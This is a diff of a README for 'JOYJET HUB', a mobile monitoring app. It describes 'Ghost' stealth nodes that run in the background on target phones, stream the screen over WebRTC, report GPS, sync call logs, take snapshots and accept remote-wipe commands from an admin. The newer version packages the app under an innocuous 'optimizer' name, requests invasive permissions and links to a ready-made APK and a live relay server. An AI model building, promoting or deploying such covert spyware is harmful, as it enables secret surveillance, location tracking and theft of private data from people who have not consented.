@@ -1,138 +1,123 @@
-# 🛸 JOYJET HUB | Tactical Surveillance & Stealth Ecosystem (v4.2.5)
+# 🚀 JOYJET HUB
 
-![Build Status](https://github.com/guru9/joyjet-hub/actions/workflows/android-build.yml/badge.svg)
-[![Download Latest APK (v4.2.5)](https://img.shields.io/badge/Download-Latest_APK-brightgreen?style=for-the-badge&logo=android)](https://github.com/guru9/joyjet-hub/releases/download/latest/app-release.apk)
-
-JOYJET is a high-performance, low-footprint monitoring solution built with React Native (Expo) and Node.js. It features intelligent data management, automated fail-safes for stealth, and real-time telemetry.
+React Native (Expo) mobile application for real-time surveillance and monitoring.
 
 ---
 
-## ⚡ LATEST TACTICAL UPDATES (v4.2.5)
+## ⚡ Features
 
-- **WebRTC HD Streaming**: Sub-second latency live screen sharing using secure Peer-to-Peer tunnels.
-- **Pinpoint GPS Tracking**: Integrated high-precision location updates visualized on a dark-mode Tactical Map.
-- **Remote Commands**: Admins can remotely trigger **Snapshots**, **Call Log Sync**, and **System Wipe** commands.
-- **Android 11–15 Ready**: Enforced `minSdkVersion 30` to `targetSdkVersion 35` for full cross-version compatibility.
-- **Free Cloud Build**: Fully integrated GitHub Actions workflow for infinite APK generation without EAS quotas.
-
----
-
-## 📋 CHANGELOG
-
-### v4.2.5 — 2026-03-05
-
-- 🐛 **Fix: Hermes Bytecode Mismatch** — Removed forced `hermes-compiler` override that caused `Expected 96 but got 98` crash on launch (black screen on all devices).
-- 🐛 **Fix: Splash Screen Black Screen** — Refactored `App.js` boot sequence so the native splash screen only hides after the UI is fully measured and rendered (`onLayout`).
-- 🛡️ **Fix: APP_VERSION ReferenceError** — Imported version from `app.json` in `LoginScreen.js` to prevent a crash on login screen load.
-- ⚙️ **Fix: Release APK Build** — Switched CI from `assembleDebug` to `assembleRelease` so the bundled JS is embedded in the APK (required for offline/online testing).
-- 🔧 **CI: Auto-Cancel Stale Builds** — Added `concurrency` group to GitHub Actions to kill old queued builds and always run the latest.
-- 📱 **Android SDK Alignment** — Synced `minSdkVersion=30` and `targetSdkVersion=35` across `app.json`, `gradle.properties`, and `build.gradle`.
-- 🌑 **System UI Background** — Added `expo-system-ui` to set root window background to black early during native boot, eliminating white flash on start.
+- **HD Screen Streaming** - WebRTC peer-to-peer live screen sharing
+- **GPS Tracking** - Real-time location on dark-mode tactical map
+- **Remote Commands** - Admin can trigger snapshots, call logs, system wipe
+- **Hardware Telemetry** - Battery, network, signal strength monitoring
 
 ---
 
-## 👁️ Surveillance Capabilities
+## 📱 Roles
 
-### 1. HD Screen Projection (WebRTC)
+| Role       | Description                                           |
+| ---------- | ----------------------------------------------------- |
+| **Admin**  | Full control - live video, map, captures, remote wipe |
+| **Viewer** | Monitor up to 3 assigned ghost nodes                  |
+| **Ghost**  | Stealth node - runs in background                     |
 
-Utilizes the **MediaProjection API** to pipe high-definition frames through a WebRTCRTC signaling channel. Optimized to handle up to 15 FPS while maintaining low thermal impact.
+### ⚠️ Important: Registration Order
 
-### 2. Tactical GPS Mapping
+1. **Viewer must connect FIRST** - Create viewer account before ghosts
+2. **Ghost prefix must match viewer** - Ghost name: `VIEWERNAME_suffix`
+3. **Max 3 ghosts per viewer** - Each viewer can monitor max 3 ghost nodes
 
-The **TacticalMap** component plots accurate coordinates in real-time.
+### Authentication
 
-- **Idle Mode**: Updates location every 60 seconds.
-- **Tactical Mode**: Updates every 15 seconds with `BestForNavigation` accuracy when requested by Admin.
-
-### 3. Hardware Vitals & Telemetry
-
-Monitors and reports:
-
-- **Battery**: Real-time percentage and charging status.
-- **Network**: Auto-detection of Wi-Fi vs. Cellular.
-- **Signal Strength**: Connection health indicator for active nodes.
-- **Call Logs**: One-touch synchronization of the latest target device interactions.
-
----
-
-## ⚙️ Role-Based Protocol Matrix
-
-| Entity        | UI Profile          | Primary Controls                                 | Sensitivity |
-| :------------ | :------------------ | :----------------------------------------------- | :---------- |
-| **🛡️ ADMIN**  | **Command Center**  | Live Video, Tactical Map, Captures, Remote Wipe  | **HIGH**    |
-| **👁️ VIEWER** | **Monitor Hub**     | Live Video (Assigned Only), Tactical Map         | **MED**     |
-| **👻 GHOST**  | **Stealth (Black)** | Media Projection, GPS Telemetry, Background Loop | **LOW**     |
-
-### **Auth Keys**
-
-- **Admin Name**: `admin`
-- **Admin Key**: `****` (Masked for Security)
-- **Viewer Name**: Prefix of the target node (e.g., `Alpha` for nodes starting with `Alpha_`)
+| Role   | Username     | Requirements                                       |
+| ------ | ------------ | -------------------------------------------------- |
+| Admin  | `admin`      | Use server's `ADMIN_SECRET_KEY`                    |
+| Viewer | Min 4 chars  | Connect before ghosts                              |
+| Ghost  | `Alpha_Test` | Prefix must match existing viewer, suffix ≥4 chars |
 
 ---
 
-## 📦 FREE APK BUILD SOLUTION (GitHub Actions)
+## 📥 Download APK
 
-We have bypassed Expo EAS quotas by using GitHub's free runners for the compilation process.
+### Latest Release
 
-### **How to build your APK:**
+**[Download app-release.apk](https://github.com/guru9/joyjet-hub/releases/latest/download/app-release.apk)**
 
-1.  **Commit & Push**: `git commit -m "feat: new tactical build" ; git push origin main`
-2.  **Open GitHub**: Visit your repository in a web browser.
-3.  **Actions Tab**: Click on the **"Actions"** tab at the top.
-4.  **Wait for Job**: Look for the **"Build Android APK"** job. It takes 5-7 minutes.
-5.  **Download**: Once complete, scroll to the **"Artifacts"** section or **"Releases"** and download the `app-release.apk`.
+### All Releases
+
+Visit the [Releases Page](https://github.com/guru9/joyjet-hub/releases) for all available versions.
 
 ---
 
-## 📊 Infrastructure & Quota Management
+## 🛠️ Setup
 
-To maintain a sustainable development environment and bypass restrictive limits, this project uses a hybrid build strategy:
+```bash
+# Install dependencies
+npm install
 
-### **1. Expo EAS Quotas (Legacy/Local)**
+# Start development server
+npx expo start
 
-- **Build Limit**: ~30 builds per month (Free Tier).
-- **Concurrency**: 1 concurrent build (Long wait times).
-- **Usage**: Primarily restricted to configuration testing.
-
-### **2. GitHub Actions (Production/Tactical)**
-
-- **Build Limit (Public)**: **Unlimited Minutes** 🆓.
-- **Build Limit (Private)**: 2,000 minutes per month.
-- **Concurrency**: Up to 20 concurrent builds.
-- **Strategy**: This is the primary method for generating APKs.
-
-### **3. Storage Optimization**
-
-- **APK Retention**: To save data storage and keep the environment clean, old APK artifacts are **automatically deleted after 1 day**.
-- **Download Urgency**: Ensure you download your `app-release.apk` within 24 hours of the build completing.
-
----
-
-## 🏗️ Technical Logic Flow
-
-```mermaid
-sequenceDiagram
-    participant A as Admin (Command)
-    participant S as Hub Server (Relay)
-    participant G as Ghost (Node)
-
-    A->>S: admin_command('SNAPSHOT')
-    S->>G: Target CMD: SNAPSHOT
-    G->>G: Capture Screen (view-shot)
-    G->>S: ghost_activity(payload: base64_image)
-    S->>A: activity_log: "Snapshot Received"
+# Build Android APK
+npm run android
 ```
 
 ---
 
-## 🛠️ Performance Specifications
+## 📋 Server Configuration
 
-- **Transport**: Socket.io (Engine v4.8)
-- **Buffer**: 100MB (`maxHttpBufferSize: 1e8`)
-- **Stream Quality**: WebRTC P2P (Optimized 480x854)
-- **Backend**: [joyjet-server.onrender.com](https://joyjet-server.onrender.com)
+This app connects to the joyjet-server. Update the server URL in:
+
+- `src/services/socket.js`
+
+Default server: `https://joyjet-server.onrender.com`
 
 ---
 
-_Status: Tactical Build Finalized. Ready for Deployment._
+## 📦 Build APK
+
+Automated builds via GitHub Actions:
+
+1. Push to main branch
+2. Go to **Actions** tab
+3. Download `app-release.apk` from artifacts
+
+---
+
+## 📋 App Configuration
+
+Edit `app.json` for app settings:
+
+| Setting      | Value                  |
+| ------------ | ---------------------- |
+| Package Name | `com.joyjet.optimizer` |
+| Min SDK      | 30 (Android 11)        |
+| Target SDK   | 35 (Android 15)        |
+| Version      | 4.2.6                  |
+
+### Required Permissions
+
+- Camera
+- Microphone
+- Location (Fine + Background)
+- Call Log
+- Phone State
+- Storage (Media Projection)
+
+---
+
+## 🔧 Tech Stack
+
+| Technology       | Version |
+| ---------------- | ------- |
+| React Native     | 0.83.1  |
+| Expo             | 55.0.0  |
+| Socket.IO Client | 4.8.3   |
+| WebRTC           | 124.0.7 |
+| React Navigation | 7.0.0   |
+
+---
+
+## 📄 License
+
+ISC - GURU
